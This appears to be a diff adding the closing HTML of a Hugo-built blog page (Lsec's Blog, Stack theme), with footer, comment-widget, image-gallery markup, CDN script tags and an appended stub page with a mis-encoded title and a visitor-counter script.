+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
